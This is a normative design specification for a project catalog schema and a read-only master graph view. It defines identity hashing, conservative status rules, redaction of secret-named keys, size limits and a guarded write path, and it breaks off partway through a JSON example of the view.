# Project Catalog Contract — `fractal.catalog.v1` and `fractal.master_graph_view.v1`

Status: normative. Machine-checkable structure lives in
[`schemas/fractal.catalog.v1.schema.json`](../schemas/fractal.catalog.v1.schema.json) and
[`schemas/fractal.master_graph_view.v1.schema.json`](../schemas/fractal.master_graph_view.v1.schema.json)
(JSON Schema draft 2020-12). This document defines everything the schemas cannot express:
identity derivation, status semantics, hashing, ordering, redaction, size ceilings, link
resolution, and the read-only composition discipline. Where this document and a schema
disagree, the stricter rule wins and the disagreement is a bug to fix in both.

The key words MUST, MUST NOT, SHOULD, and MAY are used as in RFC 2119.

Evidence base: `artifacts/audit/repository-inventory.json`
(`fractal.repository_inventory.v1`) and `artifacts/audit/graph-runtime-analysis.md` from
the onelink45 audit wave. Cited line numbers refer to the sources as inspected there.

---

## 1. Purpose and scope

The catalog is an **additive, evidence-backed index** of what a Fractal project actually
contains — capabilities, components, dependencies, test outcomes, decisions, and typed
links to other projects — stored inside the project's canonical
`.fractal/project.fractal` document. The master graph view is a **deterministic,
read-only, in-memory composition** of many catalogs across the frozen repository
inventory.

Two schema identifiers are introduced and nothing else changes:

| Schema string | Where it lives | Persistence |
|---|---|---|
| `fractal.catalog.v1` | top-level `catalog` key of a `fractal.project.v1` document | canonical, written only by `fractal graph audit` |
| `fractal.master_graph_view.v1` | process memory / HTTP response body | **never** persisted as canonical state |

The existing load-bearing schema strings — `fractal.project.v1`,
`fractal.execution_graph.v1`, `fractal.execution_state.v1` — and their closed phase and
assignment-state sets are untouched. The catalog adds no execution phases, no node
lifecycle states, and no transitions.

## 2. The additive envelope and the preservation rule

The envelope is stored as the value of the single top-level key `"catalog"` of the
`fractal.project.v1` document. In the Rust runtime this is
`FractalProject.extra["catalog"]` — the `#[serde(default, flatten)]` map at
`src/project_file.rs:28-29` — so no struct change is required and round-tripping is
already proven by the existing unknown-field tests
(`project_file.rs:1954-1991`, `project_sync.rs:1067-1098`).

**Preservation rule (normative).** Any writer that touches a document containing a
catalog — and the catalog writer itself — MUST preserve, byte-for-byte after canonical
re-serialization, all of the following sibling top-level fields and their contents:

- `schema`, `project` (identity), `graph`, `graph_hash`
- `execution` (including all assignments and their flattened extras)
- `learning`
- `efficiency`
- **every unknown top-level field** (present or future keys in `extra`)

Symmetrically, writing or rewriting the catalog MUST NOT change `graph_hash`: the graph
hash is computed over the `graph` object only (`graph_store.rs:215-228`), the catalog
lives beside `graph`, never inside it, and catalog code MUST NOT call
`graph_store::rehash_graph`. Catalog structs adopt the same flattened
`extra: BTreeMap<String, Value>` idiom at every level, so a future
`fractal.catalog.v2` producer's extra keys are not stripped when a v1 CLI rewrites the
document.

## 3. Identity: stable key derivation

### 3.1 `workspace_fingerprint`

```
workspace_fingerprint = "sha256:" + lowercase_hex( SHA-256( UTF-8 bytes of canonical_workspace ) )
```

`canonical_workspace` is the canonicalized absolute workspace root exactly as recorded by
the frozen inventory (`os.path.realpath(os.path.abspath(path))` per
`fractal.repository_inventory.v1.canonicalization`). It is the **only absolute path
permitted anywhere in the envelope**.

### 3.2 `project_key`

```
project_key = slug + "-" + first 12 hex chars of the fingerprint digest
```

matching `^[a-z0-9][a-z0-9-]{0,47}-[0-9a-f]{12}$`, where `slug` is derived from the
**final path segment** of `canonical_workspace`:

1. Lowercase the segment.
2. Replace every character outside `[a-z0-9]` with `-`.
3. Collapse runs of `-` into one; strip leading and trailing `-`.
4. Truncate to 48 characters, then strip any trailing `-` again.
5. If the result is empty, use `project`.

Examples (real, from the frozen inventory):

| `canonical_workspace` | `project_key` |
|---|---|
| `/Users/jamesstar/fractal-cli` | `fractal-cli-bbbfd315b970` |
| `/Users/jamesstar/fractal-efficiency.yFzdFF` | `fractal-efficiency-yfzdff-fe96f21dda82` |

`project_key` MUST NOT be derived from display titles, registry labels, or registry
numbers: labels are mutable aliases and registry numbers are keyed by raw uncanonicalized
workspace strings, so two registry entries can alias one directory
(`projects.rs:86-96`). `source.registry_numbers` and `source.labels` are informational
only. The 12-hex fingerprint suffix disambiguates any two distinct workspaces whose
slugs collide.

### 3.3 `component_key` and other local keys

All local keys (`components[].key`, `capabilities[].key`, `tests[].key`,
`decisions[].key`, `cross_graph_links[].key`) match
`^[a-z0-9][a-z0-9-]{0,63}$` and MUST be unique within their own array.

`component_key` MUST be derived from a **stable structural identifier** — in priority
order: the declared package/crate/target name from a manifest (`Cargo.toml [package]
name`, `package.json name`, `Package.swift` target, `.xcodeproj` basename), else the
component's topmost repository-relative path. Apply the slug sanitization of §3.2
(64-char cap instead of 48). On collision after sanitization, keys are disambiguated
deterministically: sort the colliding source identifiers ascending by their original
(pre-sanitization) UTF-8 bytes; the first keeps the bare key, the rest append `-2`,
`-3`, … in that order. A key remains stable across audits as long as its underlying
identifier is unchanged; auditors MUST NOT regenerate keys from mutable text such as
descriptions.

## 4. Envelope fields

Required top-level fields (see the schema for exact shapes): `schema`, `project_key`,
`generated_at`, `catalog_hash`, `source`, `audit`, `capabilities`, `components`,
`dependencies`, `tests`, `decisions`, `cross_graph_links`, `diagnostics`.

- **`source`** — identity and provenance: `canonical_workspace`,
  `workspace_fingerprint`, informational `registry_numbers` and `labels`, and `git`
  (`is_git_repository`, `commit`, `dirty`, `dirty_fingerprint`, `unavailable_reason`,
  sanitized `remotes` with bare-64-hex `fingerprint_sha256` matching the inventory's
  remote fingerprints).
- **`audit`** — who/what/when/how-bounded: `auditor`, optional `cli_version`,
  `inventory_hash` of the frozen inventory the audit ran against, `started_at` /
  `finished_at` (RFC 3339 UTC), `bounds` (the limits actually applied — §12), and
  `truncated`. The envelope carries its own `generated_at` and audit fingerprint because
  the document-level `updated_at` uses a non-monotonic clock and MUST NOT be relied on
  for ordering.
- **`capabilities[]`** — implemented features: `key`, `title`, optional `description`,
  `status` (§5), `evidence` (§6), `test_keys` (into `tests[]`), `component_keys` (into
  `components[]`). Every referenced key MUST exist; dangling references are a validation
  error.
- **`components[]`** — buildable/deployable units: `key`, `name`, `kind` (closed enum:
  `binary`, `library`, `module`, `service`, `app`, `ui`, `schema`, `docs`, `config`,
  `test_suite`, `other`), sorted `paths[]` (repository-relative), `status`, `evidence`.
- **`dependencies[]`** — internal component-to-component edges: `from_component`,
  `to_component` (both keys into `components[]`), `kind` (`build`, `runtime`, `dev`,
  `test`, `data`, `other`), `evidence`. `(from_component, to_component, kind)` triples
  MUST be unique.
- **`tests[]`** — native test executions: `key`, exact allowlisted `command` (from the
  inventory's `candidate_native_test_commands` or the repository's documented check
  suite), `classification` (`pass`, `fail`, `timeout`, `missing_tool`, `skipped`,
  `not_run`), `exit_code`, `duration_ms`, `log_sha256` over the **bounded, redacted**
  captured output, optional redacted `log_excerpt` (≤ 1024 chars), `evidence`. Raw logs
  are never stored.
- **`decisions[]`** — recorded design decisions: `key`, `title`, optional `summary`,
  `status` (`adopted`, `proposed`, `superseded`, `rejected`), `evidence`.
- **`cross_graph_links[]`** — typed outbound claims about other projects (§4.1).
- **`diagnostics[]`** — audit-time diagnostics with closed codes
  (`catalog_bound_exceeded`, `manifest_unreadable`, `redacted_content`,
  `symlink_escape_skipped`, `test_unavailable`), `severity` (`error`/`warning`/`info`),
  `message`, optional `context`.

### 4.1 Typed `cross_graph_links`

Each link is a claim by **this** catalog about a relationship to another project:

- `key` — unique within the catalog; edge id in the master view is
  `link:<origin project_key>/<key>` (§9).
- `type` — closed enum: `depends_on`, `uses_component`, `derived_from`, `forked_from`,
  `supersedes`, `shares_component`, `related_to`.
- `from.component_key` — origin component key, or `null` when the link originates from
  the project itself. The origin project is always this catalog's `project_key`.
- `to` — target specifier. At least one of `to.project_key` (preferred, stable) or
  `to.alias` MUST be a non-null string. An alias may be a registry label, a bare-64-hex
  remote fingerprint, or a `sha256:`-prefixed workspace fingerprint.
  `to.component_key` is `null` to target the project node itself.
- `confidence` — `high` / `medium` / `low`; plus optional `rationale` and `evidence`.

Producers MUST NOT invent `project_key`s they have not derived per §3 from the frozen
inventory; when the target's key is not derivable, emit the alias form and let the
composer resolve it (§10.2).

## 5. Conservative status semantics

`status ∈ {verified, implemented_unverified, partial, unknown}` for capabilities and
components. The rules are deliberately conservative — **when in doubt, use the lower
status**; composers and views MUST NOT upgrade a status:

- **`verified`** — requires **both** (a) at least one evidence reference (§6) and (b)
  for capabilities, at least one entry in `test_keys` whose test record has
  `classification: "pass"` from this same audit run; for components, at least one
  passing test in the catalog that exercises the component (linked through a capability
  or the component's own evidence). Only `pass` supports verification — `fail`,
  `timeout`, `missing_tool`, `skipped`, and `not_run` never do.
- **`implemented_unverified`** — the artifact demonstrably exists in the repository
  (evidence required) but no passing native test in this audit substantiates its
  behavior.
- **`partial`** — evidence shows the feature/unit exists but is demonstrably incomplete
  (e.g. stubbed paths, disabled subcommands, failing subset of its tests).
- **`unknown`** — the claim could not be substantiated: unreadable inputs, truncated
  audit, or no evidence. `unknown` with a diagnostic is always preferable to guessing.

A dirty working tree does not forbid `verified`, but every claim is then anchored by
`source.git.dirty_fingerprint` (§7) instead of a commit alone. Statuses describe **this
audit's observation**, never intent or roadmap.

## 6. Evidence: repository-relative and hashed

Every capability, component, dependency, test, decision, and link carries an
`evidence[]` list (≤ 20 refs, sorted by `(path, sha256)`). Each reference:

- `path` — **repository-relative**: MUST NOT start with `/`, `\`, or `~`, and MUST NOT
  contain a `..` segment. Absolute paths are invalid everywhere except
  `source.canonical_workspace`. Paths resolving outside the workspace via symlinks MUST
  be skipped with a `symlink_escape_skipped` diagnostic; inspection follows the
  inventory discipline (`followlinks=False`, sensitive/generated directories excluded).
- `sha256` — `sha256:<64 hex>` of the **exact file bytes as read at audit time**. This
  is what makes a claim checkable later regardless of git state.
- `kind` — `source`, `manifest`, `test_log`, `graph`, or `document`.
- `observed_commit` — HEAD (40-hex) at observation time, or `null` when git state was
  unavailable.
- optional `spans` (≤ 20 pairs `[start_line, end_line]`, 1-indexed inclusive,
  `start <= end`) and a short `note` (≤ 512 chars).

Evidence stores hashes and bounded excerpts, **never raw diffs or raw logs**.

## 7. Dirty and unavailable handling

**Dirty working tree** (`source.git.dirty == true`) or **detached/absent HEAD with
evidence present** (`commit == null`): `source.git.dirty_fingerprint` MUST be non-null:

```
dirty_fingerprint = "sha256:" + hex SHA-256 of the canonical JSON (§8) of the array of
                    all {"path", "sha256"} pairs drawn from every evidence reference in
                    the envelope, deduplicated, sorted ascending by (path, sha256)
```

This pins exactly which bytes the audit saw. When `dirty == false` and `commit` is
present, `dirty_fingerprint` MUST be `null`.

**Git unavailable** (not a repository, or HEAD unresolvable — both occur in the frozen
inventory, e.g. `not_a_git_repository` and `git_head_unavailable: …`): set
`is_git_repository` accordingly, `commit: null`, `dirty: null`, and a truthful
`unavailable_reason` (≤ 512 chars, sanitized). Evidence `observed_commit` is `null` and
the dirty-fingerprint anchor applies.

**Unavailable workspace** (inventory `exists == false`, e.g.
`workspace_path_does_not_exist`): there is nothing to audit and **no catalog is
written**. The composer carries the record in the view's `unavailable[]` array with an
`unavailable_workspace` diagnostic. Content is never fabricated for missing sources.

**Missing or invalid inputs during audit**: unreadable manifests get
`manifest_unreadable` diagnostics; a test whose tool is absent is recorded with
`classification: "missing_tool"` (or `test_unavailable` as a diagnostic when it could
not even be attempted). Failure is data; silence is not.

## 8. Canonical JSON, hashing, and deterministic ordering

**Canonical JSON** for all hashing in this contract: UTF-8 encoding, object keys sorted
ascending by byte value, compact separators (no whitespace), no NaN/Infinity, integers
without exponent form. This matches `fractal_contracts::canonical_sha256` and the
runtime's `serde_json` built **without** `preserve_order` (BTreeMap-backed maps →
sorted keys for free). `preserve_order` MUST NOT be enabled — it would silently change
the canonical bytes of every document.

- **`catalog_hash`** = `sha256:` + hex SHA-256 of the canonical JSON of the envelope
  **with the `catalog_hash` key removed**.
- **`view_hash`** = same rule over the view with the `view_hash` key removed.
- **`inventory_hash`** is copied verbatim from the frozen inventory artifact.

**Deterministic ordering (normative)** — canonical bytes must not depend on traversal
or inventory order:

| Array | Sort key |
|---|---|
| `capabilities`, `components`, `tests`, `decisions`, `cross_graph_links` | `key` ascending (keys unique) |
| `dependencies` | `(from_component, to_component, kind)` |
| every `evidence` list | `(path, sha256)` |
| `components[].paths` | ascending |
| catalog `diagnostics` | `(code, context)` |
| view `projects`, `sources` | `project_key` |
| view `nodes`, `edges` | `id` (ids unique) |
| view `diagnostics` | `(code, project_key, edge_id, context)`, `null` before any string |
| view `unavailable` | `canonical_workspace` |

Composing the same source bytes twice — including with the inventory record order
reversed — MUST yield byte-identical canonical view JSON and equal `view_hash`. The
view therefore contains **no wall-clock fields**; time lives only in the per-catalog
`generated_at`/`audit` fields, which the view does not embed.

## 9. Namespacing

Master-view identifiers are namespaced so keys from different projects can never
collide:

```
node ids:  project:<project_key>
           component:<project_key>/<component_key>
           capability:<project_key>/<capability_key>

edge ids:  link:<origin project_key>/<link key>
           dep:<project_key>/<from_component>-><to_component>[:<kind>]
```

Node ids MUST be unique; a duplicate arising from a §3.3 violation is a
`component_key_collision` diagnostic and the later (by sort order) item is dropped from
nodes while remaining counted in diagnostics. Two distinct workspaces mapping to one
`project_key` (fingerprint collision — practically impossible, but checked) is a
`project_key_collision` **error** diagnostic; the first workspace by ascending
`canonical_workspace` wins and the other is excluded from `projects[]`.

## 10. Master view composition (read-only) and link resolution

### 10.1 Read-only composition discipline

The composer (`fractal graph compose` / the master board endpoints) MUST:

1. Take the **frozen inventory artifact** (`fractal.repository_inventory.v1`) as its
   only project list — never `projects::list()`/`sync()`/`register()`, which write the
   registry. Key everything on the inventory's canonical workspaces.
2. Read each project through `project_file::load` only — full validation, no writes, no
   repair. A load failure becomes an `invalid_project_document` diagnostic with
   `catalog_state: "invalid"`, never a panic and never a repair-write. Composition MUST
   NOT route through the sync path (`backfill_execution` / `release_stale_assignments`
   rewrite files).
3. Record byte-level provenance in `sources[]`: `project_fractal_sha256` of the exact
   on-disk bytes read plus `size_bytes`, `graph_hash`, and `catalog_hash`. Re-hashing
   every source file after composition MUST reproduce these values — this is the
   read-only proof.
4. Keep the view **in-memory only**: like `fractal.execution_graph_view.v1`, it is
   rebuilt per request and never persisted, synced, or written back to any repository.
5. Serve it read-only on loopback GET endpoints; every non-GET keeps the existing 405
   behavior. No new auth surface beyond the existing control-token pattern.

Per-project `catalog_state` is one of `valid`, `invalid` (failed §-validation:
`invalid_catalog`), `missing` (no `catalog` key: `missing_catalog`, info),
`unsupported_schema` (a `catalog` key whose `schema` is not `fractal.catalog.v1`:
`unsupported_catalog_schema`; readers MUST NOT partially parse it), or `unavailable`.
Projects without valid catalogs still appear in `projects[]` (and as `project:` nodes)
with truthful state — the view degrades explicitly, never silently.

### 10.2 Link resolution and diagnostics

For each `cross_graph_link`, resolution against the frozen inventory proceeds:

1. **`to.project_key` present** → exact match against composed project keys. Match →
   `resolved`; no match → `unresolved` + `unresolved_link_target`.
2. **Else `to.alias`** → matched, in order, against: composed `project_key`s; registry
   `labels`; bare-64-hex remote `fingerprint_sha256`s; `sha256:`-prefixed workspace
   fingerprints. Exactly one project matched → resolved; zero →
   `unresolved` + `unresolved_link_target`; two or more →
   `ambiguous` + `ambiguous_alias` (the edge's `to.node_id` stays `null`).
3. A resolved target with a `to.component_key` that does not exist in the target
   catalog resolves to the target's **project node** with an
   `unresolved_link_component` warning.
4. A link resolving back to its own project gets `resolution: "self"` and a `self_link`
   diagnostic.

Unresolved, ambiguous, self, and cyclic edges are **retained** in `edges[]` (with the
original target specifier preserved verbatim under `to.raw`), never dropped and never
recursively expanded. Cross-project cycles among resolved edges are detected and
numbered deterministically: cycle groups are ordered by the smallest participating edge
`id`, and each member edge carries that `cycle_group` index plus a
`cross_project_cycle` diagnostic. Composition is single-pass over validated catalogs —
cycles are reported, not traversed.

Duplicate link keys within one catalog (`duplicate_link_key`) and duplicate alias
labels across projects (`duplicate_alias`) are diagnosed; the summary's
`links_resolved`/`links_unresolved` and `diagnostic_counts` MUST reconcile with the
arrays they summarize.

## 11. Forward compatibility

- Every object in both schemas has `additionalProperties: true`; readers MUST ignore
  unknown fields and rewriters MUST preserve them (flattened-`extra` idiom, §2).
- New enum values, new diagnostic codes, and new top-level fields arrive only with a
  schema version bump (`fractal.catalog.v2`, …). A v1 validator seeing an unknown
  `schema` string treats the whole envelope as opaque (`unsupported_schema`) — it MUST
  NOT partially parse, "fix", or delete it.
- The catalog's presence is always optional: `validate()` and all existing tooling MUST
  remain fully functional on documents with no `catalog` key.
- Everything works offline: catalog persistence and composition perform no network I/O;
  the catalog reaches the hosted graph only by riding along with a later ordinary sync
  of the whole document.

## 12. Size limits

| Bound | Value | Enforcement |
|---|---|---|
| serialized envelope (`max_catalog_bytes`) | 262 144 bytes (256 KiB) default; MUST keep the whole document far under the cloud cap | producer + validator |
| whole `.fractal/project.fractal` upload | 10 MiB (`MAX_PROJECT_UPLOAD_BYTES`) | existing sync path |
| any single string in the stored graph/document | 1 MB (graph-store cap); catalog strings are far smaller per-schema (`maxLength`s of 256–2048) | existing + schema |
| evidence refs per claim | 20; spans per ref: 20 | schema |
| capabilities / components / links | 200 each; dependencies 500; tests / decisions 100; diagnostics 200 | schema |
| `log_excerpt` | 1024 chars | schema |
| view: projects/sources/unavailable 2048; nodes/edges 65 536; diagnostics 16 384 | schema + `view_truncated` |

When any bound forces material to be dropped or shortened, the producer MUST set
`audit.truncated: true` and emit a `catalog_bound_exceeded` diagnostic naming what was
cut; the composer analogously emits `view_truncated`. Silent truncation is forbidden.
`audit.bounds` records the limits actually applied so truncation is auditable.

## 13. Redaction and forbidden keys

The document-wide secret scans are recursive, so these rules apply at **every nesting
level** of the catalog:

- **Forbidden key names** — no object key may lower-case/hyphen-normalize to:
  `access_token`, `api_key`, `authorization`, `credentials`, `password`,
  `private_key`, `refresh_token`, `secret`, `secrets`, `token`. Schema authors and
  producers MUST also avoid `cookie` (rejected by the GitHub-publication scan). Count
  metrics use names like `realized_tokens_saved` — never a bare `token`/`tokens` key. A
  single violating key poisons validation, cloud sync, and publication of the **whole**
  document.
- **Values** — never store raw diffs, raw logs, environment dumps, or credentialed
  URLs. Remote URLs appear only in sanitized form (credentials stripped) beside their
  `fingerprint_sha256`. Captured test output is bounded and redacted before hashing:
  secret-like lines are replaced with `[redacted]`, `log_sha256` is computed over the
  redacted bytes, and each redaction is recorded with a `redacted_content` diagnostic.
- The catalog validator (`src/project_catalog.rs`) MUST validate the typed envelope,
  then encode it to JSON and run the secret-field rejection over the encoded value
  before insertion — mirroring the efficiency-ledger pattern — because the top-level
  `validate()` does not currently scan `extra`.

## 14. Write path and mutation authority

Only `fractal graph audit` may write the catalog, and only through the guarded seam:

```
fractal graph audit …                  (the only mutation authority)
  └─ project_audit::collect            (read-only evidence, bounded, redacted)
       └─ project_catalog::validate    (schema + bounds + secret scan + invariants §5–§8)
            └─ project_file::mutate_document   (process mutex + .lock file + validate + atomic 0o600 rename)
                 └─ document.extra["catalog"] = catalog     — nothing else touched
```

Catalog code MUST NOT call `persist`, `transition`, `checkout_start_node`,
`finish_node`, `release_node`, `rehash_graph`, or any sync entry point, and MUST NOT
create, modify, or delete `execution.assignments`, learning lifecycle timestamps,
checkpoints, or `sync-state.json`. No generic "set arbitrary JSON at path" API is
exposed. Long audits compute the envelope **outside** the lock and hold the write guard
only for the single load-merge-write (concurrent workers block ≤ 10 s on the lock
file). An invalid envelope leaves the on-disk bytes unchanged.

Legacy surfaces are out of bounds entirely: no reading, writing, globbing, or extending
`graph-state.json` / `graph-state-*.json`, no Python task-state endpoints, no
hand-editing `.fractal` files. `fractal graph compose` / master endpoints call only read
paths and can therefore never acquire the write guard at all.

## 15. Examples

### 15.1 Valid `fractal.catalog.v1` envelope

This example is complete and self-consistent: `workspace_fingerprint` is the SHA-256 of
`canonical_workspace`, `project_key` embeds its first 12 hex chars,
`dirty_fingerprint` is the §7 hash over the deduplicated sorted evidence pairs, and
`catalog_hash` is the §8 canonical hash of the envelope without the `catalog_hash` key.
It is also embedded as `examples[0]` of the catalog schema.

```json
{
  "schema": "fractal.catalog.v1",
  "project_key": "fractal-cli-bbbfd315b970",
  "generated_at": "2026-08-02T14:05:00Z",
  "source": {
    "canonical_workspace": "/Users/jamesstar/fractal-cli",
    "workspace_fingerprint": "sha256:bbbfd315b97032d8324f48b8ab1b9c749b26fffcb3b2680d26b2df797b29a0de",
    "registry_numbers": [
      18
    ],
    "labels": [
      "fractal-cli"
    ],
    "git": {
      "is_git_repository": true,
      "commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936",
      "dirty": true,
      "dirty_fingerprint": "sha256:1d37ac05c6ba35babc75f38d674716dc6e313a970f864297ebcecc479196d258",
      "unavailable_reason": null,
      "remotes": [
        {
          "name": "origin",
          "fingerprint_sha256": "f1057ab13991aac2f870f5e8a03e76b7f40c7e6ea63a5130d2296458d36164fa",
          "sanitized_url": "https://github.com/fractalsociety/fractal-cli.git"
        }
      ]
    }
  },
  "audit": {
    "auditor": "fractal graph audit",
    "cli_version": "0.9.4",
    "inventory_hash": "sha256:a0bbf8551226effda0186e95c0c2a0ae7efb5edc67d77b992f2b4ec5342b7baa",
    "started_at": "2026-08-02T14:03:12Z",
    "finished_at": "2026-08-02T14:05:00Z",
    "bounds": {
      "max_catalog_bytes": 262144,
      "max_evidence_per_claim": 20,
      "max_log_excerpt_chars": 1024,
      "max_string_chars": 2048,
      "test_timeout_ms": 600000
    },
    "truncated": false,
    "evidence_counts": {
      "document": 1,
      "manifest": 3,
      "source": 3
    }
  },
  "capabilities": [
    {
      "key": "canonical-project-persistence",
      "title": "Locked, validated, atomic persistence of .fractal/project.fractal",
      "description": "Canonical project documents are written through an in-process mutex, a cross-process lock file, full validation, and atomic tmp-file rename.",
      "status": "verified",
      "evidence": [
        {
          "path": "src/project_file.rs",
          "sha256": "sha256:9995a3cab75478c9b31048a286f7306e900f28a2b9287a5fe4a5d0c4c7ee3ffa",
          "kind": "source",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936",
          "spans": [
            [
              82,
              147
            ],
            [
              1692,
              1709
            ]
          ]
        }
      ],
      "test_keys": [
        "cargo-test"
      ],
      "component_keys": [
        "fractal-cli-bin"
      ]
    }
  ],
  "components": [
    {
      "key": "fractal-chain",
      "name": "fractal-chain",
      "kind": "library",
      "paths": [
        "crates/fractal-chain"
      ],
      "description": "Workspace member crate consumed by the CLI binary.",
      "status": "implemented_unverified",
      "evidence": [
        {
          "path": "crates/fractal-chain/Cargo.toml",
          "sha256": "sha256:3b2ae8deb4e2d8180d66ea39487fa918f3b36f8b3e15a5d528866bebf94efa1a",
          "kind": "manifest",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936"
        }
      ]
    },
    {
      "key": "fractal-cli-bin",
      "name": "fractal-cli",
      "kind": "binary",
      "paths": [
        "src"
      ],
      "description": "The fractal CLI binary: project persistence, sync, graph board.",
      "status": "verified",
      "evidence": [
        {
          "path": "Cargo.toml",
          "sha256": "sha256:ef8fc612f76a9d498c83f355ed5c8de77544102887a806dbed110ac89f78fccc",
          "kind": "manifest",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936"
        },
        {
          "path": "src/main.rs",
          "sha256": "sha256:cc6f2fade9c857e73bfd1d1dcb2d9c93eb48ef376c75e19c180294b59d95b7e9",
          "kind": "source",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936"
        }
      ]
    }
  ],
  "dependencies": [
    {
      "from_component": "fractal-cli-bin",
      "to_component": "fractal-chain",
      "kind": "build",
      "evidence": [
        {
          "path": "Cargo.toml",
          "sha256": "sha256:ef8fc612f76a9d498c83f355ed5c8de77544102887a806dbed110ac89f78fccc",
          "kind": "manifest",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936",
          "spans": [
            [
              12,
              25
            ]
          ]
        }
      ]
    }
  ],
  "tests": [
    {
      "key": "cargo-test",
      "command": "cargo test --no-fail-fast",
      "classification": "pass",
      "exit_code": 0,
      "duration_ms": 41250,
      "log_sha256": "sha256:1a46b67449e33a32d4f3335cc7072442d774a058db25255a3240579d45c9a0e1",
      "log_excerpt": "test result: ok. 212 passed; 0 failed; 0 ignored",
      "evidence": [
        {
          "path": "Cargo.toml",
          "sha256": "sha256:ef8fc612f76a9d498c83f355ed5c8de77544102887a806dbed110ac89f78fccc",
          "kind": "manifest",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936",
          "note": "declares the cargo test suite"
        }
      ]
    }
  ],
  "decisions": [
    {
      "key": "additive-catalog-envelope",
      "title": "Catalog data lives additively under the top-level extra map",
      "summary": "The catalog is stored beside graph/execution/learning/efficiency, never inside graph, so graph_hash and execution history are untouched.",
      "status": "adopted",
      "evidence": [
        {
          "path": "AGENTS.md",
          "sha256": "sha256:427b8d1fec3e96272c50caa265186ff003be37f01b71043b127a6075d476b920",
          "kind": "document",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936"
        }
      ]
    }
  ],
  "cross_graph_links": [
    {
      "key": "shares-fractal-chain",
      "type": "shares_component",
      "from": {
        "component_key": "fractal-chain"
      },
      "to": {
        "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
        "alias": "fractal-efficiency.yFzdFF",
        "component_key": "fractal-chain"
      },
      "confidence": "high",
      "rationale": "Both workspaces vendor the same fractal-chain crate at crates/fractal-chain.",
      "evidence": [
        {
          "path": "crates/fractal-chain/Cargo.toml",
          "sha256": "sha256:3b2ae8deb4e2d8180d66ea39487fa918f3b36f8b3e15a5d528866bebf94efa1a",
          "kind": "manifest",
          "observed_commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936"
        }
      ]
    }
  ],
  "diagnostics": [],
  "catalog_hash": "sha256:7996e73720de288102cb1b0af161830086f2f09ed38449c01a3a087b99dd913d"
}
```

### 15.2 Valid `fractal.master_graph_view.v1`

Complete and self-consistent (`view_hash` verifies per §8); embedded as `examples[0]`
of the view schema. Note the truthfully-carried unresolved link and unavailable
workspace from the frozen inventory.

```json
{
  "schema": "fractal.master_graph_view.v1",
  "inventory_hash": "sha256:a0bbf8551226effda0186e95c0c2a0ae7efb5edc67d77b992f2b4ec5342b7baa",
  "summary": {
    "projects_total": 3,
    "available_inventory_count": 2,
    "audited_available": 2,
    "invalid_catalogs": 0,
    "node_count": 6,
    "edge_count": 3,
    "links_resolved": 1,
    "links_unresolved": 1,
    "cycle_count": 0,
    "diagnostic_counts": {
      "error": 0,
      "warning": 2,
      "info": 0
    }
  },
  "projects": [
    {
      "project_key": "fractal-cli-bbbfd315b970",
      "canonical_workspace": "/Users/jamesstar/fractal-cli",
      "workspace_fingerprint": "sha256:bbbfd315b97032d8324f48b8ab1b9c749b26fffcb3b2680d26b2df797b29a0de",
      "labels": [
        "fractal-cli"
      ],
      "registry_numbers": [
        18
      ],
      "available": true,
      "catalog_state": "valid",
      "graph_hash": "sha256:9b9b72c888c3bf318515a95dc79c16af21175cb1ead37c3a742839b4e8de48bb",
      "catalog_hash": "sha256:7996e73720de288102cb1b0af161830086f2f09ed38449c01a3a087b99dd913d",
      "git": {
        "commit": "56df19ed4dd0f19b56fc2c10faaa40278dc07936",
        "dirty": true,
        "unavailable_reason": null
      },
      "status_counts": {
        "verified": 2,
        "implemented_unverified": 1,
        "partial": 0,
        "unknown": 0
      }
    },
    {
      "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "canonical_workspace": "/Users/jamesstar/fractal-efficiency.yFzdFF",
      "workspace_fingerprint": "sha256:fe96f21dda82b510eee6d8c9aa48f3d89134180a836ac7816ccfe5b43713d159",
      "labels": [
        "fractal-efficiency.yFzdFF"
      ],
      "registry_numbers": [
        32
      ],
      "available": true,
      "catalog_state": "valid",
      "graph_hash": "sha256:3e4043e530b4b6079a71e12ff5df7457d26bf9dd6c55d2ee7035ae39d3b45ab6",
      "catalog_hash": "sha256:959c87020618c71d818fb6547b80c6435cbf3b304ea781876e907c9c7e96d39d",
      "git": {
        "commit": "df332a6ab5a093efe40fe914858de07829f24a93",
        "dirty": true,
        "unavailable_reason": null
      },
      "status_counts": {
        "verified": 0,
        "implemented_unverified": 1,
        "partial": 0,
        "unknown": 0
      }
    }
  ],
  "nodes": [
    {
      "id": "capability:fractal-cli-bbbfd315b970/canonical-project-persistence",
      "kind": "capability",
      "project_key": "fractal-cli-bbbfd315b970",
      "key": "canonical-project-persistence",
      "title": "Locked, validated, atomic persistence of .fractal/project.fractal",
      "status": "verified"
    },
    {
      "id": "component:fractal-cli-bbbfd315b970/fractal-chain",
      "kind": "component",
      "project_key": "fractal-cli-bbbfd315b970",
      "key": "fractal-chain",
      "title": "fractal-chain",
      "status": "implemented_unverified",
      "component_kind": "library"
    },
    {
      "id": "component:fractal-cli-bbbfd315b970/fractal-cli-bin",
      "kind": "component",
      "project_key": "fractal-cli-bbbfd315b970",
      "key": "fractal-cli-bin",
      "title": "fractal-cli",
      "status": "verified",
      "component_kind": "binary"
    },
    {
      "id": "component:fractal-efficiency-yfzdff-fe96f21dda82/fractal-chain",
      "kind": "component",
      "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "key": "fractal-chain",
      "title": "fractal-chain",
      "status": "implemented_unverified",
      "component_kind": "library"
    },
    {
      "id": "project:fractal-cli-bbbfd315b970",
      "kind": "project",
      "project_key": "fractal-cli-bbbfd315b970",
      "key": "fractal-cli-bbbfd315b970",
      "title": "fractal-cli"
    },
    {
      "id": "project:fractal-efficiency-yfzdff-fe96f21dda82",
      "kind": "project",
      "project_key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "key": "fractal-efficiency-yfzdff-fe96f21dda82",
      "title": "fractal-efficiency.yFzdFF"
    }
  ],
  "edges": [
    {
